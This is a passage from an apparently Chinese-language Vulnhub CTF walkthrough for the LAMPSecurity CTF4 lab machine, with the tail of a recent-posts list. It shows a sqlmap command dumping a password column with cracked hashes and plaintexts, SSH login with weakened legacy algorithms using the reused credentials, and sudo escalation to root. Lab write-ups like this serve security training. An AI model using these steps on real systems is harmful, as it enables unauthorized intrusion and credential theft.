achen\t\n<span class=\"hljs-number\">3</span>\t      pmoore\t\n<span class=\"hljs-number\">4</span>\t      jdurbin\t\n<span class=\"hljs-number\">5</span>\t      sorzek\t\n<span class=\"hljs-number\">6</span>\t      ghighland\t\n\n</code></pre>\n<p>单独<code>dump</code> 密码</p>\n<pre><code class=\"hljs language-php\"> sqlmap -r post -D ehks -T user -C user_pass --dump\n<span class=\"hljs-comment\">//</span>\n+--------------------------------------------------+\n| user_pass                                        |\n+--------------------------------------------------+\n| <span class=\"hljs-number\">02e823</span>a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |\n| <span class=\"hljs-number\">64</span>d1f88b9b276aece4b0edcc25b7a434 (pacman)        |\n| <span class=\"hljs-number\">7</span>c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |\n| <span class=\"hljs-number\">8</span>f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |\n| <span class=\"hljs-number\">9</span>f3eb3087298ff21843cc4e013cf355f (undone1)       |\n| <span class=\"hljs-title function_ invoke__\">b46265f1e7faa3beab09db5c28739380</span> (seventysixers) |\n+--------------------------------------------------+\n</code></pre>\n</li>\n<li>\n<p><code>Blog</code>后台和<code>mail</code>后台都可以登陆进去，寻找可利用点，甚至ssh</p>\n<ul>\n<li>\n<p><code>Blog</code>找不到可利用点</p>\n</li>\n<li>\n<p><code>mail</code> 后台是<code>SquirreMail1.4.17</code> ，存在远程代码执行漏洞，不过很麻烦先试试<code>ssh</code></p>\n</li>\n<li>\n<p><code>ssh</code>登陆显示，版本太旧的原因</p>\n<pre><code class=\"hljs language-php\">ssh pmoore@<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.138</span>\nUnable to negotiate with <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.138</span> port <span class=\"hljs-number\">22</span>: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1\n</code></pre>\n<p>指令修改为即可尝试登录</p>\n<pre><code class=\"hljs language-php\">ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss -oCiphers=+<span class=\"hljs-number\">3</span>des-cbc pmoore@<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.138</span>\n</code></pre>\n<p>最后使用 <code>dstevens</code> 和<code>ilike2surf</code> 成功登录获得<code>shell</code></p>\n</li>\n</ul>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>查看当前shell权限</p>\n<pre><code class=\"hljs language-php\">[dstevens@ctf4 ~]$ whoami\ndstevens\n[dstevens@ctf4 ~]$ dpkg -l\n-bash: dpkg: command not found\n[dstevens@ctf4 ~]$ sudo -l\nPassword:\nUser dstevens may run the following commands on this host:\n    (ALL) ALL\n\n</code></pre>\n<p>权限是超级高的，相当于root权限</p>\n<pre><code class=\"hljs language-php\">[dstevens@ctf4 ~]$ sudo -i\n[root@ctf4 ~]<span class=\"hljs-comment\"># </span>\n</code></pre>\n<p>获得root权限了</p>\n</li>\n</ol>","title":"Vulnhub - LAMPSecurity CTF4","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机"},"recentPosts":[{"id":"HackTheBoxMachine - Cap","title":"HackTheBox - Machine - Cap","date":"2025-06-11","isEncrypted":false,"year":"2025","month":"06","day":"11"},{"id":"Personalsunset","title":"Personal - sunset","date":"2025-06-10","isEncrypted":true,"year":"2025","month":"06","day":"10"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Season8 - TombWatcher","date":"2025-06-08","isEncrypted":true,"year":"2025","month":"06","day":"08"},{"id":"HackTheBoxMachine - Bucket","title":"HackTheBox - Machine - Bucket","date":"2025-06-06","isEncrypted":false,"year":"2025","month":"06","day":"06"},{"id":"HackTheBoxMachine -Support","title":"HackTheBox - Machine - Support","date":"2025-06-05","isEncrypted":false,"year":"2025","month":"06","day":"05"},{"id":"HackTheBoxMachine - Hospital","title":"HackTheBox - Machine - Hospital","date":"2025-06-04","isEncrypted":false,"year":"2025","month":"06","day":"04"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Season8 - Certificate","date":"2025-06-02","isEncrypted":true,"year":"2025","month":"06","day":"02"}]},"__N_SSG":true}